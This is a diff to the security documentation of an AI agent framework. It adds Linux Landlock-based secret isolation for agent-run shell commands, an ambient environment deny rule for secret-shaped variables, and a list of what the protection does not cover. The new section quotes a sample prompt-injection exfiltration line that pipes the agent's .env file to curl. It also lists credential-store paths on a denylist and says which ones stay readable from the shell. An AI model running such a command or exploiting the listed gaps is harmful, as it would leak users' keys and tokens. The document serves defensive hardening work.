@@ -10,7 +10,7 @@ Hermes Agent is designed with a defense-in-depth security model. This page cover
 
 ## Overview
 
-The security model has eight layers:
+The security model has nine layers:
 
 1. **User authorization** — who can talk to the agent (allowlists, DM pairing)
 2. **Dangerous command approval** — human-in-the-loop for destructive operations
@@ -20,6 +20,7 @@ The security model has eight layers:
 6. **Context file scanning** — prompt injection detection in project files
 7. **Cross-session isolation** — sessions cannot access each other's data or state; cron job storage paths are hardened against path traversal attacks
 8. **Input sanitization** — working directory parameters in terminal tool backends are validated against an allowlist to prevent shell injection
+9. **Secret isolation for agent-run commands (Linux)** — with the `local` backend, the kernel keeps Hermes secret stores out of the agent's shell, background processes, `execute_code` and cron scripts ([details](#secret-isolation))
 
 ## Dangerous Command Approval
 
@@ -361,6 +362,7 @@ These categories are always denied, even when `HERMES_WRITE_SAFE_ROOT` is unset:
 |----------|----------|
 | OS credential stores | `~/.ssh/` (keys, `authorized_keys`), `~/.aws/`, `~/.kube/`, `/etc/sudoers`, `~/.netrc` |
 | Hermes secret stores | `.env`, `.anthropic_oauth.json`, `auth/google_oauth.json`, Bitwarden cache (`cache/bws_cache.json`, `cache/bws_cache.enc.json`), `vault/`, `browser-profile/`, `mcp-tokens/`, `pairing/` under HERMES_HOME (active profile and global root). Control files (`auth.json`, `config.yaml`, `webhook_subscriptions.json`) are read-denied but stay writable. |
+| Gateway code | `hooks/` and `plugins/` under every Hermes home and profile: the gateway imports that code in-process, outside any sandbox ([details](#secret-isolation)) |
 | Windows NT/device-namespace paths | `\??\...`, `\\.\...`, `\\?\UNC\...`, `\\?\GLOBALROOT...` — rejected for both reads and writes on every platform. On Windows, merely *resolving* such a path (e.g. `\??\UNC\host\share`) triggers outbound SMB authentication and can leak the user's NTLM hash; the prefixes also bypass normal path normalization. Ordinary extended-length local paths (`\\?\C:\...`) and plain UNC shares (`\\server\share`) are unaffected. |
 
 Project-local `.env`, `.env.local`, `.env.production` and `.envrc` files are **read-denied** anywhere on disk (the file tools refuse to read them) but remain writable: the agent can create or edit them for you, it just cannot read the values back.
@@ -402,7 +404,7 @@ Unset the variable to restore unrestricted writes (subject to the protected-path
 Do not ask the agent to `patch` `~/.hermes/cron/jobs.json` directly. Use the `cronjob_manage` tool, [`hermes cron`](./features/cron.md), or `/cron` — they update the job store through the supported API. The same applies to other Hermes control files when write safety blocks direct edits.
 
 :::note Defense-in-depth, not a hard boundary
-Write guards apply to `write_file` and `patch` only, with one exception: the Windows NT/device-namespace row is also enforced on reads — `read_file`, `search_files`, `@file:`/`@folder:` context references and the ACP file bridge all refuse those paths on the raw string, before anything resolves them. The `terminal` tool runs as the same OS user and can still `cat` or overwrite denied paths via shell commands. The denylist reduces accidental damage and gives models a clear stop signal; it does not sandbox a hostile or compromised agent.
+Write guards apply to `write_file` and `patch` only, with one exception: the Windows NT/device-namespace row is also enforced on reads — `read_file`, `search_files`, `@file:`/`@folder:` context references and the ACP file bridge all refuse those paths on the raw string, before anything resolves them. The `terminal` tool runs as the same OS user and can still `cat` or overwrite denied paths via shell commands. The denylist reduces accidental damage and gives models a clear stop signal; it does not sandbox a hostile or compromised agent. On Linux, [secret isolation](#secret-isolation) closes that gap for the Hermes secret stores, `config.yaml`, `hooks/` and `plugins/`; other denied paths (such as `~/.ssh`) stay reachable from the shell.
 :::
 
 ## User Authorization (Gateway)
@@ -587,13 +589,73 @@ If you add names to `terminal.docker_forward_env`, those variables are intention
 
 | Backend | Isolation | Dangerous Cmd Check | Best For |
 |---------|-----------|-------------------|----------|
-| **local** | None — runs on host | ✅ Yes | Development, trusted users |
+| **local** | None — runs on host (Linux: secret stores kernel-isolated, see [below](#secret-isolation)) | ✅ Yes | Development, trusted users |
 | **ssh** | Remote machine | ✅ Yes | Running on a separate server |
 | **docker** | Container | ❌ Skipped (container is boundary) | Production gateway |
 | **singularity** | Container | ❌ Skipped | HPC environments |
 | **modal** | Cloud sandbox | ❌ Skipped | Scalable cloud isolation |
 | **daytona** | Cloud sandbox | ❌ Skipped | Persistent cloud workspaces |
 | **vercel_sandbox** | Cloud microVM | ❌ Skipped | Cloud execution with snapshot persistence |
+
+## Secret Isolation for Agent-Run Commands (Linux) {#secret-isolation}
+
+With the `local` backend the agent's shell runs as the same OS user as Hermes, right next to `.env`, `auth.json` and the token stores, so a single obeyed prompt injection could be `cat ~/.hermes/.env | curl -d @- …`. On Linux, every agent-driven child process is started under a [Landlock](https://docs.kernel.org/userspace-api/landlock.html) ruleset. The kernel enforces it, the child inherits it, and nothing the agent runs can lift or widen it.
+
+**Which processes:** foreground `terminal` commands (including the login-shell snapshot), background/PTY processes, the `execute_code` kernel, and no-agent cron scripts. The Hermes process itself, MCP servers, plugins, hooks and the in-process file tools are **not** inside the ruleset (see [What it does not cover](#secret-isolation-limits)).
+
+**What they cannot touch,** for the active `HERMES_HOME`, the global root and every profile under `profiles/`:
+
+| Access | Paths |
+|--------|-------|
+| No access (read or write) | `.env`, `auth.json`, `auth.lock`, `.anthropic_oauth.json`, `webhook_subscriptions.json`, `auth/google_oauth.json`, `cache/bws_cache.json`, and the `auth/`, `mcp-tokens/`, `vault/`, `browser-profile/`, `pairing/` directories |
+| Read-only | `config.yaml` (the agent cannot change its own approval or isolation settings from the shell), `hooks/` and `plugins/` (code the gateway imports in-process; the file tools refuse writes there too) |
+
+Directories that hold a secret (`HERMES_HOME` itself and each of its parents up to `/`) are **entry-frozen**: existing files can be read and written and every subdirectory works normally, but no entry can be created, deleted or renamed directly in them. That stops a child from replacing `.env` or `config.yaml`, or moving a secret out by rename or hard link. Work in `workspace/` or a project directory, not in the `HERMES_HOME` root. A home that holds no secret files yet (a first run, or an empty scratch home) is not frozen.
+
+The isolated processes also run with `PR_SET_NO_NEW_PRIVS` (`sudo` and setuid binaries do not elevate), and the spawning Hermes process is marked non-dumpable so same-user processes cannot read its `/proc/<pid>/environ` or attach a debugger. Side effects: no core dumps or `py-spy` attach for the gateway, and `hermes` CLI commands run *from the agent's shell* cannot read `.env`.
+
+### Requirements and modes
+
+Landlock needs Linux 5.13 or newer with Landlock enabled in the kernel's LSM list, and any seccomp profile around Hermes must allow the three Landlock syscalls (podman's default profile does). Blocking `truncate` on protected files needs kernel 6.2 or newer; read protection works from 5.13.
+
+```yaml
+security:
+  terminal_secret_isolation: auto   # auto (default) | require | off
+```
+
+| Mode | Linux with Landlock | Linux without Landlock | macOS / Windows |
+|------|---------------------|------------------------|-----------------|
+| `auto` (default) | Isolated | Run unprotected, one-time warning | Run unprotected, one-time warning |
+| `require` | Isolated | Commands are **refused** (fail closed) | Run unprotected, one-time warning |
+| `off` | Not isolated | Not isolated | Not isolated |
+
+Set `require` wherever the agent reads untrusted content: with `auto`, a host that loses Landlock (an older kernel, a stricter seccomp profile) falls back to unprotected commands with only a log warning. Unknown values and an unreadable `config.yaml` count as `require`. macOS and Windows have no implementation; where this protection matters, run Hermes on Linux or use a container or remote terminal backend. In `require` mode commands are also refused while a protected file has a second hard link, because that alias would sit outside the protected directory.
+
+A refused command prints:
+
+```text
+hermes: refusing to run this command: Landlock is unavailable (needs Linux >= 5.13 with landlock enabled and allowed by seccomp). Without it the agent's shell could read Hermes secrets. Set security.terminal_secret_isolation: auto (run unprotected) or off in config.yaml to override.
+```
+
+To check a host or container, run `python3 -c "import ctypes; print(ctypes.CDLL(None).syscall(444, None, 0, 1))"`: a number of 1 or more is the supported Landlock version, a negative number means unavailable.
+
+### Ambient environment is deny-by-default {#ambient-secret-deny}
+
+On every platform, children whose environment Hermes scrubs (the terminal, background processes, no-agent cron scripts, and the other scrubbed spawns listed under [Environment Variable Passthrough](#environment-variable-passthrough)) no longer inherit:
+
+- any variable a `.env` file (your own or the managed one) or an external secret source supplied to Hermes, whatever its name;
+- any secret-shaped name, i.e. one with a `KEY`, `TOKEN`, `SECRET`, `PASSWORD`, `PASS`, `CREDENTIALS`, `AUTH`, `COOKIE`, `DSN`, `PRIVATE` or `WEBHOOK` component (`AWS_SECRET_ACCESS_KEY`, `CLAUDE_CODE_OAUTH_TOKEN`, `MY_APP_KEY`; `KEYBOARD_LAYOUT` is not one).
+
+Core shell variables (`PATH`, `HOME`, `LANG`, `LC_*`, `TERM`, `TZ`, …), `HERMES_SESSION_*` context and values you set explicitly (`terminal.env`, a backend's own `env`) are kept. To hand a specific secret to the shell or to a cron script, list it in `terminal.env_passthrough` (or let a skill declare it). An administrator-managed value listed there keeps its precedence over a profile's own `.env`.
+
+### What it does not cover {#secret-isolation-limits}
+
+Secret isolation narrows the local backend and the Docker image; it does not turn either into a sandbox. For agents that read untrusted content, use a whole-process wrapper as described in [SECURITY.md](https://github.com/NousResearch/hermes-agent/blob/main/SECURITY.md) §2.2.
+
+- **In-process code and direct children.** Plugins, gateway hooks and the file tools run inside the Hermes process; MCP servers are spawned by it with their own environment filter but full file access. Of these, only `hooks/` and `plugins/` are additionally write-protected from the agent.
+- **Operator-configured scripts.** Webhook filter scripts and `config.yaml` shell-hook commands run outside the ruleset.
+- **Other same-user processes.** `/proc/<pid>/environ` of any other process running as your user (an MCP server, for example) stays readable. Keep secrets in `$HERMES_HOME/.env` rather than passing them as container environment (`podman -e`, `--env-file`), which puts them in every process's initial environment.
+- **Homes without secrets.** Until a secret file exists, nothing is frozen, so a child could create a missing `config.yaml` or `.env`. The official Docker image always seeds both on first start.
 
 ## Environment Variable Passthrough {#environment-variable-passthrough}
 
@@ -681,7 +743,7 @@ With the switch off Hermes never reads or refreshes those files: the `claude_cod
 | Sandbox | Default Filter | Passthrough Override |
 |---------|---------------|---------------------|
 | **execute_code** | Blocks vars containing `KEY`, `TOKEN`, `SECRET`, `PASSWORD`, `CREDENTIAL`, `PASSWD`, `AUTH` in name; only allows safe-prefix vars through | ✅ Passthrough vars bypass both checks |
-| **terminal** (local) | Blocks explicit Hermes infrastructure vars (provider keys, gateway tokens, tool API keys) | ✅ Passthrough vars bypass the blocklist |
+| **terminal** (local) | Blocks explicit Hermes infrastructure vars (provider keys, gateway tokens, tool API keys), plus every `.env`/secret-source-supplied or secret-shaped name ([ambient deny](#ambient-secret-deny)) | ✅ Passthrough vars bypass both |
 | **terminal** (Docker) | No host env vars by default | ✅ Passthrough vars + `docker_forward_env` forwarded via `-e` |
 | **terminal** (SSH) | No host env vars by default | ✅ Passthrough vars forwarded via `SendEnv`; the remote `sshd_config` needs a matching `AcceptEnv` (see [SSH backend](configuration.md#ssh-backend)) |
 | **terminal** (Modal) | No host env/files by default | ✅ Credential files mounted; env passthrough via sync |
@@ -936,7 +998,7 @@ Most third-party code Hermes can run is gated by an explicit allow-list: general
 |-----------------|-------------|-------------|--------|
 | [Gateway event hooks](./features/hooks.md#gateway-event-hooks) | `<profile home>/hooks/<name>/` (`HOOK.yaml` + `handler.py`) | Gateway startup (`HookRegistry.discover_and_load()`), per served profile | **Placing the directory.** No `plugins.enabled` entry, no prompt; `HERMES_SAFE_MODE` does not skip it. |
 
-The gateway imports every valid hook directory in-process, with the gateway's own privileges. This is the documented contract (since `3988c3c245f`), not an oversight: the profile home is operator-owned configuration, and anyone who can write into it can already run code as you through `config.yaml` shell hooks or by editing `plugins.enabled`, so a separate consent gate for `hooks/` would add friction without moving the trust boundary. Treat the contents of `~/.hermes/hooks/` like the contents of `config.yaml` — review a `handler.py` before you place it, and include `ls ~/.hermes/hooks/` whenever you audit the rest of the profile home (the directory is not on the [protected-paths denylist](#file-write-safety), so it is ordinary writable state). Full details: [gateway hook trust model](./features/hooks.md#gateway-hook-trust).
+The gateway imports every valid hook directory in-process, with the gateway's own privileges. This is the documented contract (since `3988c3c245f`), not an oversight: the profile home is operator-owned configuration, and anyone who can write into it can already run code as you through `config.yaml` shell hooks or by editing `plugins.enabled`, so a separate consent gate for `hooks/` would add friction without moving the trust boundary. Treat the contents of `~/.hermes/hooks/` like the contents of `config.yaml` — review a `handler.py` before you place it, and include `ls ~/.hermes/hooks/` whenever you audit the rest of the profile home (the agent itself cannot write there: `hooks/` is on the [protected-paths denylist](#file-write-safety) and read-only for agent-run commands, see [Secret isolation](#secret-isolation); place hooks yourself). Full details: [gateway hook trust model](./features/hooks.md#gateway-hook-trust).
 
 ## Supply-chain advisory checking
 
